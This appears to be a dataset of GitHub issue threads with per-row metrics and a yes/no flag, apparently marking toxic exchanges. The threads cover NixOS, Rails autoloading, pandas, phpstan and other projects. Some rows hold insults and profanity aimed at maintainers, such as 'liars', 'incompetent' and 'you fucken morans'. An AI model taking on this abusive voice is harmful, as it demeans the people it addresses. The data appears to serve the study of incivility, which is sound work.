accommodate reasonable ones on Hydra (for ""free"" SW at least).  This discussion is not leading to anything productive. Therefore I'm closing this issue. The other comment was edited to include the ""incompetence"" of someone responsible for the release. This language is not acceptable. You're just discrediting the hard work of our community without having contributed anything yourself. Please help instead of insulting people who want to help you. hankey I do not understand your arguments about the legal issue and will not waste any time discussing this with you. Please open a PR with alternative wording or shut up about this.  @friend You are lying again, since it has actually led to something productive in the referenced issues. As such you are essentially discrediting me, while in fact I did make a useful contribution, albeit not in code, but with a comment to the upstream author of the package causing the issue. Clearly, that has been useful. If you lack the mental capabilities to understand a legal argument, you should delegate decisions to others who do. Criticism is discrediting ""the hard work"" and can optionally include mentioning things that went well, which is exactly what I did. The fact that you haven't learned the concept of criticism as a grown man must make your life difficult. You are the one wasting the time of the community with your lies and the fact that the released software broke basic features. If you can't be bothered to run a couple of terminal emulators in all the popular environments (there are about 4 or so), why call yourself ""responsible"" for the release? If you want to receive credit for a quality release, make a quality release and you will be credited in history with this fact. The flip side is that when you don't, you get the blame and effectively negative credits. If the person responsible for this isn't incompetent, then the person responsible is not willing to make it work, which would be even worse. If you are going for the ""we don't have the resources angle"", then don't make a release at all. Closing an issue for accurately describing a release, because you disagree and you can is nothing short of what Bashar al-Assad would do. With your policy, you should just add an EULA to NixOS stating that one cannot write a review or publish a bug report about NixOS. Perhaps ask Oracle's legal team for advice on such matters. I sincerely hope that you will learn to take criticism in the future. In a corporation, this issue would be reopened, until all the dependent issues have been solved. Since no such reference has been made, I believe this is not the case. As such the only rational course of action is to reopen this issue. I will close it when the referenced issues have all been resolved. If I can upgrade to 18.03 in some months without issues I will press the thumbs up button to credit the merit of whoever is responsible for the 18.03 release if someone else makes a review of the 18.03 release. In short, please stop pissing me off, especially since I am very limited in the amount of time I can spend here. A community doesn't grow when you piss people off.  As noted, this isn't an appropriate way to engage with the NixOS community. I invite you to not participate in communities you think are full of liars and incompetent people. Maybe a different distribution has more competent members that will leave you satisfied.  I wanted to write a response how we treat people regardless how much they contribute to NixOS community, but I feel we've gone through this so many times that I just blocked @friend You're still welcome to use our free software, but you're not welcome by contributing harsh words. ",89,7,542,0,0,429,18,y,
nixpkgs/NixOS/32393,0.149763675,NixOS,nixpkgs,solvespace: Opening a file dialog crashes Solvespace on KDE Plasma,2053,20,9,0,0,"Issue description Using any of the following file menu commands opening a file dialog window will crash Solvespace on KDE Plasma  Open... Save Save As... Export Image... Export 2d View... Export 2d Section... Export 3d Wireframe... Export Triangle Mesh... Export Surfaces... Import...  If Solvespace is started from a konsole, one gets the following error message after the program crash A similar, maybe the same, problem was already discussed in solvespace/solvespace#215, but could not be solved. In addition, other programs experience(d) similar problems in NixOS, e.g., #24943. Steps to reproduce  Install Solvespace by adding  to the list of  in  and running  Log in KDE Plasma Open a Konsole Run  Open a file dialog by, e.g., selecting File -&gt; Save...  Technical details  system  host os  multi-user?  sandbox  version  channels(root)  nixpkgs    You opened the issue originally in the right location. The author of solvespace should fix his program to report a specific error message and not crash inside one of its dependent libraries. This is not a NixOS problem. Solvespace is developed on a particular operating system and as a result it only is portable to that system. If you want to make the program work on NixOS, you need to fix the program. The observed behaviour does not warrant a change in NixOS. The solvespace people refer to ""Building on Linux"". This seems to suggest that they think it is portable across Linux systems, while it obviously is not. Portable code runs unmodified and without patches across a wide range of *nix based systems. I suggest you run it inside a Docker container or inside a Debian VM until they fix it.  For what it is worth, williammpratt's attitude here is not representative of the NixOS community's attitude toward other software. The user has since been blocked from the NixOS organization.  Looks like  is missing in the derivation.  I added this hook here 9c89e52ff20fc0f569afe8126e7f442ca575a676  This issue was rediscovered in #32651. Backported in 3bee0c2f618df4197bc146259109adbf70a999d2. ",3,0,81,0,0,85,1,n,
nokogiri/sparklemotion/1736,0.149281925,sparklemotion,nokogiri,NOKIGIRI IS HARD PLEZ HELP ,1036,10,6,0.615384615,1,"am trying to make a script to search by user by entering in there first name it should display the detail of that user this interacts with the file email.xml please help me !!!  i can get it to read the xml doc and display all users i just need someone to give some exmaple code or show me how the hell i am supposed to do this thanks )  Hello! Thanks for asking this question! Your request for assistance using Nokogiri will not go unanswered! However, Nokogiri's Github Issues is reserved for reporting bugs or submitting patches. If you ask your question on the mailing list, Team Nokogiri promises someone will provide you with an answer in a timely manner. If you'd like to read up on Team Nokogiri's rationale for this policy, please go to  you so much for understanding! And thank you for using Nokogiri.  uuhhhh there was a bug with nokogiri its a scuffed gem ???? and annoying and not very user friendly for something that claims to be user friendly On Sat, Mar 17, 2018 at 152 AM, Mike Dalessio notifications@friend.com wrote ",5,10,27,0.230769231,0.153846154,23,11,y,
objectbox-java/objectbox/375,0.053596938,objectbox,objectbox-java,"Bug: warnings when using the library about ""androidTestApi"" and ""androidTestCompile"" being used",2292,23,18,0.666666667,1,"Issue Basics  ObjectBox version (are using the latest version?) ? 1.4.1  Reproducibility [occurred once only | occasionally without visible pattern | always] always   Reproducing the bug Description Describe the situation in English in which you encounter the bug. Just create a project that uses the library via gradle. No need for code. The bug is that the IDE will warn about having these lines in gradle, even though I don't have them. They appear only when using this library. Here's a sample project MyApplication.zip The warnings you get Code *Provide the code triggering the bug. No need Logs &amp; stackstraces *Check if you have relevant logs and/or a stacktrace. No need Entities Provide the code for entities related to the bug (shorten to relevant parts). None Misc *Is there anything special about your app? No Did you find any workarounds to prevent the issue?* No  In case this is an IDE/gradle issue, I've written about it here as well  Thanks for reporting. The ObjectBox Gradle plugin did still add a dependency (jsr305) using the  configuration instead of the new . This was already fixed and will be released with the next version of the plugin (is in , but it has a bug, so wait for  or higher). -ut  Is it available? If so, how can I use it?  If it's not available, why close this?  Closed because it is fixed (!= released), the fix will be released with the next update (likely 1.4.6). -ut  How could I verify it's fixed, if it's not released... Therefore it doesn't make sense to close it. The issue still exists in all versions that are available.  Just re-open the issue or comment if the fix is not successful. See our comments and the milestone info to learn what release an issue was resolved in. This is how we handle issues, please adapt.  -ut  @friend I can't, because it's not available, and once it is available, I won't be notified about it. And even if I do get notified, how could I dig into all the issues to get here, if it's closed... It should have been this way  issue reported issue confirmed (and if not, closed) issue fixed bug fixed published, including telling here that it's published. anyone who subscribed to the bug report (me in this case) get notification and can check it back. confirmation that it indeed got fixed, and can be closed.  ",11,4,103,0.111111111,0.222222222,64,8,n,
okhttp/square/4274,0.13069676,square,okhttp,you fucken morans,140,0,3,1,0,if you call  response.body().string() twice like  this response.body().string() response.body().string() you will get this unsolvable error ,1,1,18,0,0,0,0,n,
openshot-qt/OpenShot/2189,0.165700955,OpenShot,openshot-qt,Garbage,1534,20,10,1,0,"Spent a couple of hours making a video. All I did was add audio and text over the footage. I put everything in place. I watched it over to make sure everything was timed right. Everything was saved. I'd opened it up a couple of times having taken breaks and all... And then when it exports it doesn't look right at all. It's as if the clips had scrambled. I open the project file again, same thing. Everything was jumbled and half of the text I'd added was no longer there. It'd show the box but not the text. Haven't been able to produce a single video yet with this awful software and after uninstalling it, I never will. Windows 10, Asus, 8G of ram and all that other useless nonsense. Just updated the software today.  @friend We are sorry about the terrible experience you have had with our software. If you still willing to help sort out the issue can you please fill out the information below. Describe the bug A clear and concise description of what the bug is. System Details (please complete the following information)  Operating System / Distro [e.g. Windows 10, Linux Mint 17.1] OpenShot Version [e.g. 2.4.1]  To Reproduce Steps to reproduce the behavior  Go to '...' Click on '....' Scroll down to '....' See error  Expected behavior A clear and concise description of what you expected to happen. Screenshots If applicable, add screenshots to help explain your problem. Logs If you are experiencing a crash, please collect and attach logs of the problem. Additional context Add any other context about the problem here. ",5,0,68,0,0,49,0,y,
orm/doctrine/7192,0.12324186,doctrine,orm,"and, or doesn't work in DQL ",826,14,19,0,0,"I migrate a mysql db to sqlAnywhere(sqla) to test my app developed with Doctrine2. Acces to sqla works, DQL like $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng ); $query-&gt;setParameters(array(     'lng' =&gt; 'DE'             )); $result = $query-&gt;getResult(); also runs funny. $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.connum = num ); $query-&gt;setParameters(array(     'num' =&gt; '4'             )); $result = $query-&gt;getResult(); also no problems! BUT! $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng AND e.connum = num'); $query-&gt;setParameters(array(     'lng' =&gt; 'DE',     'num' =&gt; '4',             )); $result = $query-&gt;getResult(); doesn't work!! $result = empty! with operator OR it's the same problem! Any idea! # ",0,0,140,0,1,74,7,n,
pandas/pandas-dev/13475,0.109799503,pandas-dev,pandas,BUG: index.name not preserved in concat in case of unequal object index,1434,9,43,0,1,"xref #13742 for addl cases. So the issue seems to be with a string index that is not equal, as when the index of the two frames is equal (no NaNs are introduced), the name is kept and also when using numerical indexes, see  I use the concat function with input dataframes that have index.name assigned, sometimes the resulting dataframe has the index.name assigned, sometimes it does not. I ran the code below from the python interpreter, using a conda environment with pandas-0.18.1 I don't see any odd / extra characters around the ""pert_well"" column in the files between the files. Code Sample, a copy-pastable example if possible results Expected Output c.index.name should be ""pert_well"" output of pd.show_versions() INSTALLED VERSIONS commit None python 2.7.11.final.0 python-bits 64 OS Linux OS-release 2.6.32-573.7.1.el6.x86_64 machine x86_64 processor x86_64 byteorder little LC_ALL None LANG C pandas 0.18.1 nose None pip 8.1.2 setuptools 23.0.0 Cython None numpy 1.11.0 scipy None statsmodels None xarray None IPython None sphinx None patsy None dateutil 2.5.3 pytz 2016.4 blosc None bottleneck None tables None numexpr None matplotlib None openpyxl None xlrd None xlwt None xlsxwriter None lxml None bs4 None html5lib None httplib2 None apiclient None sqlalchemy None pymysql None psycopg2 None jinja2 None boto None pandas_datareader None PMEL_input_files_for_pandas_issue.zip  experiencing the same bug on pandas 0.24.2 ",1,0,70,0,0,79,0,n,
pandas/pandas-dev/7750,0.07674511,pandas-dev,pandas,GH6848 silently changed series.sort from stable to unstable sort,473,6,5,0,0,"6848 is no where mentioned in the release notes. There's a single item on changing to quicksort, but it doesn't explicitly warn that the sort was previously stable and now isn't. There's also no warning about  changing as well. That API has been around forever and afaict nothing was gained by breaking it. This was a fairly reckless change in my opinion, I do wish the current maintainers cared more about backwards-compatibility then they seem to in the latest releases. ",0,0,12,0,0,8,0,y,
pandas/pandas-dev/9216,0.135483745,pandas-dev,pandas,"No way to construct mixed dtype DataFrame without total copy, proposed solution",2399,21,16,0,2,"After hours of tearing my hair, I've come to the conclusion that it is impossible to create a mixed dtype DataFrame without copying all of its data in. That is, no matter what you do, if you want to create a mixed dtype DataFrame, you will inevitably create a temporary version of the data (e.g. using np.empty), and the various DataFrame will constructors will always make copies of this temporary. This issue has already been brought up, a year ago  is especially terrible for interoperability with other programming languages. If you plan to populate the data in the DataFrame from e.g. a call to C, the easiest way to do it by far is to create the DataFrame in python, get pointers to the underlying data, which are np.arrays, and pass these np.arrays along so that they can be populated. In this situation, you simply don't care what data the DataFrame starts off with, the goal is just to allocate the memory so you know what you're copying to. This is also just generally frustrating because it implies that in principle (depending potentially on the specific situation, and the implementation specifics, etc) it is hard to guarantee that you will not end up using twice the memory you really should. This has an extremely simple solution that is already grounded in the quantitative python stack have a method analagous to numpy's empty. This allocates the space, but does not actually waste any time writing or copying anything. Since empty is already taken, I would propose calling the method from_empty. It would accept an index (mandatory, most common use case would be to pass np.arange(N)), columns (mandatory, typically a list of strings), types (list of acceptable types for columns, same length as columns). The list of types should include support for all numpy numeric types (ints, floats), as well as special Pandas columns such as DatetimeIndex and Categorical. As an added bonus, since the implementation is in a completely separate method, it will not interfere with the existing API at all.  There are many many threads on SO asking for this feature. It seems to me that all these problem stem from BlockManager consolidating separate columns into a single memory chunks (the 'blocks'). Wouldn't the easiest fix be to not consolidate data into blocks when copy=False is specified. I have a non-consolidating monkey-patched BlockManager    I used to work around this problem. ",12,0,76,0,0,47,0,n,
papirus-icon-theme/PapirusDevelopmentTeam/1453,0.38890854,PapirusDevelopmentTeam,papirus-icon-theme,missing icons in Lxde,51,2,2,0.666666667,0,"you don't want to respect us, we don't respect you ",0,0,3,0,0.333333333,0,0,y,
phpstan/phpstan/1856,0.057366912,phpstan,phpstan,I have no idea what this does,3316,51,23,0.222222222,2,"I can't find any formal documentation for this project and the readme doesn't seem to give any indication as to what, exactly, this tool does. Compare this with phpstan-strict-rules, which is very clear and up-front about what it does, specifying in the head of the readme everything it checks for. Why is a plug-in more useful than the thing its plugging into? That seems backwards to me.  I honestly don‚Äôt get your opinion. I recently removed a list of checks because it was outdated and caused a visual clutter  of this tool is a verification that it‚Äôs useful so I recommend you to try it out. What it does is in the first paragraph of the current README it. It catches whole classes of bugs even before you write tests for the code. It moves PHP closer to compiled languages in the sense that the correctness of each line of the code can be checked before you run the actual line. If you want to read more, there‚Äôs a link to Medium.com article which is also in the readme  this issue as invalid, while scratching my head... On Tue, 29 Jan 2019 at 1257, Bilge notifications@friend.com wrote -- Ond≈ôej Mirtes  Writing somewhere a list of checks is not a good fit for human consumption because it‚Äôs overwhelming. Rather than that, I welcome everyone to try it on their codebase...  The popularity of the project is clear, but i'm inclined to agree with the OP here (despite phrasing not being very constructive). Exhaustive docs and lists of options are nice. Compare with rector (which is auto generated) or psalm, which do this very well.  I‚Äôd love to hear about a use-case for this. It‚Äôs clear that static analysis is a must have for PHP projects now and it‚Äôs most valuable to know what kind of issues it finds on your projects. Instead of a long wall of text, there should be a better way to present it. Currently, the best way is to run PHPStan on your code. I don‚Äôt want to write something that no one will read. Instead, I‚Äôd like to design something that fulfills a use-case, but I don‚Äôt know what the use-case is. On Tue, 29 Jan 2019 at 1317, Ben Davies notifications@friend.com wrote -- Ond≈ôej Mirtes  Btw I already do comprehensive release notes for each release so if you‚Äôre interested in what‚Äôs new (that‚Äôs a use case!), I‚Äôve got you covered. On Tue, 29 Jan 2019 at 1322, Ond≈ôej Mirtes ondrej@friend.cz wrote -- Ond≈ôej Mirtes  If you cannot (or will not) attempt to understand me, I suppose there's nothing we can do. Too bad, because @friend seems to have understood perfectly. The last time someone told me to ""just run it"", with regards to software, was when I received a virus on ICQ circa 200x. Nowadays I prefer to know what I'm running.  PHPStan is open-source. You have the option to learn what you‚Äôre running. There‚Äôs very readable rules configuration and a test suite that you can use for this purpose. And of course source code itself. You can even contribute the documentation you‚Äôd like to see present. Since I already took out portion of my day to reply to you, and I don‚Äôt like when my software is compared to a virus, I‚Äôm locking this conversation. Thanks for understanding. On Tue, 29 Jan 2019 at 1328, Bilge notifications@friend.com wrote -- Ond≈ôej Mirtes  I also invited you to brainstorm ideas how the documentation should look so I‚Äôm very sad it ended in this non-constructive way. ",11,87,109,0.444444444,0.333333333,99,2,y,
rabbitmq-website/rabbitmq/559,0.11110623,rabbitmq,rabbitmq-website,Please remove trackers & advertising,1092,7,6,1,0," Doesn't look too good to me on an open source project page üòî. Also the TrustArc/Truste popup is really annoying and slow. Is it necessary as this site provides nothing that's under the ""Functionality NOT Allowed"" right?   There is NO advertising on this site, go dive into the source. Besides Google Analytics and Twitter, and perhaps YouTube embeds on the home page there are no trackers involved. We are required to use TrustArc by our corporate sponsor. We are looking at alternatives (there is no ETA) or at least a separate instance that does not contact 300 services of which we only use 2 or 3.  Those who absolutely don't want TrustArc or any trackers have the option of running a local instance of the site. See the README, it is straightforward. Once you have a local copy running, remove Google Analytics, TrustArc and Twitter from the layout.  FTR we've switched to a new instance of TrustArc that only contacts the services we use. Our testing suggests that moving to Required Only cookies now takes about 2-4 seconds now as opposed to over 2 minutes when this issue was filed. ",0,0,27,0,0,51,1,n,
rails/rails/13142,0.055494538,rails,rails,Rails falls back on non-thread-safe autoloading even when eager_load is true,14650,147,119,0,1,"In Rails 3.x, the  config option was available for controlling whether autoloading was enabled as a fallback in case eager loading fails. This option has been removed from Rails in this commit e6747d87. The behaviour was changed so that autoload is disabled entirely when eager loading is enabled. This seems to make sense to me. However, in a8bf129, the initializer which disabled autoload when eager load is true was removed entirely. Now we're stuck with Rails behaving in a non-threadsafe way by default, which is possibly very difficult to detect. I realize I can add my own initializer to solve this problem, but if we're encouraging people to build threadsafe apps by default now, then it shouldn't require this level of knowledge to make Rails behave in a thread-safe way. The reasoning in a8bf129 seems flawed to me. Failing hard is a good thing, failing hard means subtle thread safety issues don't arise in a production environment sometimes because someone forgot a require somewhere. Thread safety is hard enough as it is. In my opinion, a8bf129 should be reverted. If this is deemed too aggressive, then maybe the  option should be reinstated, probably set to true by default, I can prepare a pull request for this if this is the preferred option.  I remember that one of the issues that made a8bf129 is that people usually put lib in the autoload path, and since lib usually may have a lot of development/test only files these files will be loaded by default in production. In my opinion we should bring back  Between this was the biggest discussion in the history of the Rails core and seems we will start again smile  @friend unfortunately both reverting a8bf129 and adding back  are problematic because the only way to really test it is live in production. However, Rails is still threadsafe by default because all the default autoload paths are eagerly loaded as well. The problem only appears when a developer adds a directory to  that is not eagerly loaded - typically this is the  folder. This folder often contains all sorts of junk and because of this it's not safe to eagerly load it by default as you would see strange errors when running in production by including development related code and libraries. The alternative of hard failing is unpalatable as it's often old apps with weaker test coverage that have added  to  and making these fail hard is something we decided after a lengthy discussion that we didn't want to do (93 messages and multiple Campfire discussions!). If developers follow our guidelines of not changing , adding directories to  for autoloading code and explicitly requiring code in  then Rails will be threadsafe.  Agree with @friend  @friend Where are these guidelines documented? If changing autoload_paths is discouraged, then this should be documented somewhere, as far as I can tell, no such documentation exists. Ideally, manipulating the list of load paths should generate a warning. I know this is common cannon, but ""everyone knows this"" really doesn't cut it in terms of documentation. I'm worried by the fact that this whole reasoning builds on the fact that eager_load works perfectly, can we really guarantee that it does? With this in place, autoloading is still enabled, it could still be triggered, it could still create thread-safety problems. My experience with threaded programming is that you want to eliminate even the possibility of thread-safety issues if you can.  @friend I thought we had something in Configuring Rails Applications but I may have been thinking of Ryan Bigg's guides. If there's nothing, then I will add something. We went through a list of possible scenarios about warning people - they all sucked in one way or another. Does eager loading work perfectly? Probably not as nothing is perfect but I know that it'll require every file in your  array which is as good as it's likely to get. We can't protect against people doing crazy stuff like requiring the same file in different threads so something may break. Our default position can't be to break people's apps in production after they've upgraded by disabling all code loading, so given that I've not seem any significant traffic on this topic since we've released Rails 4 I'm loathe to make changes to it.  The thing that worries me is not so much that it misses a file, but rather that it misses a constant. There any number of ways an additional, undefined constant might pop up during request processing. What happens then? Since autoloading is still enabled, we'll still hit load_missing_constant, this methods uses a lot of global state. I have no idea what'll happen, maybe it works just fine because there is no possibility of anything being mutated, but I don't know the code well enough.  By the way, we ended up calling  in an after_initialize block. IMO this is a good compromise, autoloading is enabled during the initialization process, which means all its convenience is there, and we don't have to worry too much about explicit requires. Since initialization is single-threaded this is safe. However, once we start processing requests, constants can no longer be autoloaded. Maybe I'm missing something, but this seems pretty safe to me.  The scenario is that a developer has added  to  which is not eager loaded because it's full of junk you don't want in production like tasks, generators, etc. You then call  and start processing requests but a controller action not yet requested refers to an undefined constant and when it's reached it'll blow up. It's this that we want to prevent when upgrading Rails applications.  @friend what about adding  directory to brand new rails application?  You can add it now if you want and it'll work like any other app folder - I don't think we want to add it by default as a lot of apps have empty lib folders so adding another empty folder seems unnecessary.  @friend you wrote this The problem is that in the case where an app is multi-threaded, and we don't switch off autoload, the case would be that it probably won't blow up, but random stuff will mysteriously sometimes fail in weird ways. So ask yourself this, what would you rather want, option 1) where you can get an exception at runtime, or option 2) where you get random, unpredictable, weird, hard to explain, difficult to debug bugs at runtime. Personally, I'm going to choose option 1. The downside of thread-safety issues is so much worse than the downside of the possibility of an exception. The way you're handling it makes it sound as though thread-safety is not important, as though Rails is still optimizing for the single-threaded case. That seems like a huge step back.  Depends on the situation, would you prefer your highly traffic, e-commerce website to fail for all orders in the checkout or a small percentage of them. You may say option one but the accountant may say option 2. As long as the code you write is thread safe then you'll be fine. If it's not then whether we autoload or not isn't really going to save you if you don't know what you're doing as there are many ways to make code not thread safe - autoloading is just one of them. All Rails is doing is not facepunch-ing you with an exceptions when you upgrade - if you want to facepunch yourself by all means go ahead. smile I'm more than willing to accept a patch to the guides telling developers how to remove the autoloading but I think we have the right default given the amount of thought that went into making the decision.  Who is going to run into a situation where all their orders fail and they don't notice? There are staging environments and smoke tests for these kinds of things. It's way more insidious and harder to notice when 0.1% of your orders fail as opposed to 100% of your orders failing. That's the point I'm trying to make. Failing hard is good. Especially with regards to thread safety. Also, honestly, you're telling me to go fuck myself? What kind of way is that of handling legitimate issues in an open source project? I don't think I've been discourteous in any way, I'm simply trying to get you to see my perspective on this. In 8 years in the Ruby community, I've never seen this much discussed shitty attitude we supposedly have, until today. I'm seriously very disappointed.  Trust me, not every project has these kind of things - in an ideal world, yes, but we don't live in an ideal world. I think you've misinterpreted what I was trying to say - what I'm saying is that going for a hard fail is an aggressive choice. That may be your preference but we can't adopt it as a default, however I'm willing to accept changes to make it easier if a developer wishes be that aggressive in their own projects. If I caused offence, I'm sorry.  Should any one stumble upon this issue @friend reverted commit a8bf129 in  which is in v5.0.0.beta1 and later.  IMO auto-load should be disabled as a feature completely if it is not going to work. It is very frustrating for a new rail developer to read in documentation to add lib into auto_load list and then trying to deploy strange errors begin to happen. And auto_load can happily start raising an error that it is not supported and eaget_load needs to be used. This will not confuse anybody unlike present situation. It could be documented that lib can be added to eager_load instead which works fine in production env.  As @friend mentioned above, the autoloader should be removed from Rails. It has never worked as advertised, and I do not see any chance of that thing ever working. In the past, it has demonstrated a complete misunderstanding of namespaces, injecting constants in wrong scopes and making it impossible to structure Rails projects without resorting to terminology from deep down the thesaurus. At the very least, the ""documentation"" should be amended to have a big and clear warning that relying on anything but top-level constants inside  being picked up will lead to problems.  @friend actually one of the long-standing issues (which is a Ruby problem and not a Rails problem) where a top level constant is found because of  being in the ancestor chain of  and not  will be fixed in Ruby 2.5. In my experience with working on a range of apps developed by other teams, any problems with autoloading has been down to incorrect additions to autoload_paths - just use folders inside app for stuff that's eager/auto loaded and lib for things that are manually required. That and strict mapping of namespace hierarchy to path names eliminates 99.99% of problems. Autoloading in Rails is both the basis for eager loading in production and for reloading in development - I don't see the value in removing those features. If you want to manually control loading in your Rails app then it's perfectly possible to set up if you so desire, but it's not the default experience we want.  @friend , I was not specific in my last comment. For me it was frustrating that autoloading worked perfectly well in dev env but not in production env. In production some classes in a deeper namespace were missing. I think the way I setup auto-load [1] must be correct because it worked in dev env. As soon as I run server (even locally) in production mode, it was giving troubles. It might have something to do with the issue you link to, because I have one class with same name in top namespace and under a module. Or maybe just in production  is using multiple workers. In any case, if autoloading is not recommended as it appears from this thread, then do not advertise it in documentation. As soon as I've put lib in the eager load list instead of the auto-load list, things started to work properly in production env. There is no official documentation listing the situations where autoloading might be an issue. I don't see how it makes sense to keep current situation - documentation advertises auto-loading, github thread discourages using it, there appears to be no incentive to fix auto-loading. The easiest solution is to at least update documentation to recommend eager loading instead of auto loading. I can't see any reason for not not doing this. [1] Here's how I actually do inside   @friend the recommendation is to create app/lib and drag all those files that need to work with reloading/autoloading/eagerloading into there from lib and not touch the config at all. We've taken out the comment about autoload_paths from the generated application.rb so the only way someone will find it is if they go looking for it. Willing to accept a PR that places a great big warning in the relevant config section of the guide that basically says 'Here be dragons ‚Ä¶' üòÑ  @friend , I'm neither so knowledgeable about rails internal nor so good with english to update the guide. IMO a simple adding of a warning would not help a lot. In the doc link I posted originally, there is a whole section about  and is mentioning auto-loading in various places. Very little is said about eager loading. Also in this guide, there is no mention of  nor google showed results when I was searching about . Do you know where is a good place to file an issue about the aforementioned guide?  @friend, a mechanism that will inject top-level constants into modules is defective, and not due to a ""Ruby problem"". Case in point, we tried having a class . I literally had the following happen in a console &gt; AProcess == Process false &gt; AProcess == Process true  I am currently rewriting a medium-sized project to explicit loading of things in  (which is funny because something will still finger around in there before explicit loading and provoke constant re-assignment warnings‚Ä¶), and stumbled upon another instance where lookup would be similarly broken. This is not a Ruby problem! Plain Ruby does not arbitrarily screw up namespaces that badly; it takes a lot of work to create something as fragile and wrong.  @friend that's not what I see with a clean Rails app If you can reproduce your experience in a clean Rails app then please file a bug report.  This is Bad.  The whole purpose of lib in the first place is to seperate non-domain-specific code from the app/ directory, which is domain specific. Rails seems to be content to violate established best practices regarding the division between lib/ and app/.  Messed up  @friend  so what would be your recommendation then? i do agree with you, that an external API wrapper should not be placed anywhere inside /app and personall i would rather see it in /lib  won't autoload. Rails 5.1  Any link for best practise guidelines here?  üôÑ seems fine to move  inside . Just takes a minor adjustment in thinking, nbd. Alternatively, you could do what my coworker did and add  to  ‚ô†¬Ø_(„ÉÑ)_/¬Ø` ",67,12,405,0,0,207,13,y,
rails/rails/17194,0.083961978,rails,rails,Routes redirect helper should honor request format,3514,50,44,0,0,"The  helper is hard-coded to return an html body with a Content-Type of . This can raise issues in some HTTP libraries when trying to follow non-html redirects if they try to parse the body, based on the initial request format, before following the redirect. While this isn't exactly a bug on rails's part, I think it is unexpected behavior and merits discussion on if/how it should change. The solution that makes the most sense to me would be always maintaining the content type of the instigating request and trying to come up with a sane default response for common ones, falling back to  for unrecognized ones so nobody's parsers choke on it.  Do you have some specific examples of an HTTP library that it causes an issue with? I'm thinking about the spec for 307 redirects Unless the request method was HEAD, the entity of the response SHOULD contain a short hypertext note with a hyperlink to the new URI(s) , since many pre-HTTP/1.1 user agents do not understand the 307 status.  The same is true for 301 and 302. So I'd suspect the content type is correct, and this should remain as is. Although we should check it handles the HTTP HEAD case correctly.  @friend since you can write your own custom redirect proc I don't think it's worth addressing this within the  helper unless you can come up with a situation where this is a problem. If you can supply some further information that raises the importance of this issue we'll take another look at it.  Ah, this just bit me again. The http library is , with . The middleware attempts to parse the redirect's body with the issued Content-Type before following the Location header. Using Faraday with FollowRedirects breaks on Rails generated redirects, both from  in controllers and  in routes.  A proof-of-concept fork can be found here. If vetted, I'd be happy to submit it as a PR with tests, with a little direction on where I ought to put the shared code. ActionDispatch is a bit of an uncharted territory to me, and I'm not sure how it independent of ActionController it ought to be, or vice-versa. I ended up placing the method in ActionController simply because I noticed  already loaded , so why not  as well?  @friend that still sounds like bug in Faraday - is it blowing up because it's trying to parse the response as  even though it's returned as  ?  Yep, it's making parsing assumptions based on the requested Content-Type, not the returned intermediary one. As mentioned‚Äì While this is definitely a Faraday bug, there's a case to be made for Rails to try to honor the requested Content-Type in its auto-genned responses, given that's the only actionable format information available to it at the time.  My thoughts are mostly that this might be a nice-to-have feature with the API-friendly attitude Rails is adopting these days, rather than a bug report. Since it's something I've ran into more than once, thought I'd take its heartbeat again.  Ugh, sorry‚Äìsome of the places I've used  I meant . Got confused jumping back and forth from the client's perspective. I think getting my header nomenclature right illustrates why this feels unexpected if we asked for , and Rails isn't returning with , then it should be responding with the  we told it we would accept. Technically this isn't in spec for the  family, but it seems intuitive.  @friend I'd need to see another example of where it's a problem other than a Faraday bug before I could get behind changing it - don't want to support something going forward that isn't really necessary. ",20,1,105,0,0,103,3,n,
rails/rails/29632,0.055689376,rails,rails,When LoadError#path is nil LoadError#is_missing? throws NoMethodError,6678,91,238,0,2,"It's possible for  to be  when a mixin included in  is misnamed, resulting in a crash on boot with a none-too-useful error Full stack trace here  to reproduce I have several chunks of application-wide helper functionality split out into mixins like They are included in  Everything works fine when the names are correct, but when they aren't - say  includes  by accident - I get a crash on boot with the above stack trace. It's worth noting that i'm using inflections to define a  acronym, though when messing around it doesn't seem to make a difference. There are actually two  calls on the line in question  I hacked a  in there and confirmed that it's  that is . Expected behavior The error message should reflect the problem - missing module, bad file name, etc. Actual behavior The  method itself errors, raising a  that does little to indicate the underlying problem. System configuration Rails version 5.1.1 Ruby version 2.3.4  I tried to look at this bug, but I was not able to reproduce. Could you post a code that would reproduce the bug?  @friend, I also tried to reproduce but I was not able like @friend , meaning that I see a different error output. I created a new app adding just the css_helper.rb file and including it in application_helper.rb and when i boot in production env i get the following error message that seems quite useful from /Apps/issue-29632/app/helpers/application_helper.rb1in &lt;top (required)&gt;' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb12in block in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/concurrency/share_lock.rb149in exclusive' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb11in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb150in block in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in map!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/action_controller/metal/helpers.rb93in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb109in helper' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb187in default_helper_module!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in block in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in class_eval' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionview-5.1.1/lib/action_view/layouts.rb217in inherited'  Btw, if I include HelperMixinsCSSHelper in application_helper.rb i get another error because it is searching for CssHelper instead `rescue in block in modules_for_helpers' Couldn't find HelperMixinsCssHelper, expected it to be defined in helpers/helper_mixins/css_helper.rb (NameError) I will investigate more on this to understand if it is actually a bug or not.  Yes, the underlying issue is that the helper is misnamed. Easy to fix. 